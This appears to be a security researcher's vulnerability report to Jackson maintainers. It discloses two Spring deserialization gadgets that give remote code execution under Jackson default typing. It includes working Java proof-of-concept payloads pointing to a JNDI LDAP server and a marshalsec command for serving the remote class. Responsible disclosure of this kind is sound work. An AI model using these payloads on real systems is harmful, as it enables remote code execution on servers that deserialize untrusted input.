Hi,
I found 2 gadgets that could exploit jackson deserialize from unsafe use 's input lead to RCE

- First gadget: `org.springframework.aop.config.MethodLocatingFactoryBean` class in `spring-aop`.
    when jackson deserialize json, setBeanFactory() method is called with parameter is
    instanceof org.springframework.jndi.support.SimpleJndiBeanFactory.
    This gadget work similar to gadget `org.springframework.beans.factory.config.PropertyPathFactoryBean`
- Second gadget: `org.springframework.beans.factory.config.BeanReferenceFactoryBean`
   class in `spring-beans`.
   This gadget work similar to gadget `org.springframework.beans.factory.config.PropertyPathFactoryBean`

Attachment file is demo project, please read README.md file to demo
Best regards
Bui Duong of Viettel Cyber Security

-----

public class Main {
    public static void gadget1() throws JsonProcessingException {
        String remoteServer = "ldap://localhost:1389/RCE";
        String json = "[\"org.springframework.aop.config.MethodLocatingFactoryBean\",
{\"targetBeanName\": \"" + remoteServer + "\", \"methodName\":\"Foo\",
\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",
 {\"shareableResources\":[\"" + remoteServer + "\"]}]}]";
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        Object o = objectMapper.readValue(json, Object.class);
    }

    public static void gadget2() throws JsonProcessingException {
        String remoteServer = "ldap://localhost:1389/RCE";
        String json = "[\"org.springframework.beans.factory.config.BeanReferenceFactoryBean\",
{\"targetBeanName\": \"" + remoteServer + "\",
\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\", {\"shareableResources\":[\"" + remoteServer + "\"]}]}]";
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        Object o = objectMapper.readValue(json, Object.class);
    }
    public static void main(String[] args) throws Exception {
// create ldapserver
// java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost/#RCE 1389
        gadget1();
        //gadget2();
    }
}
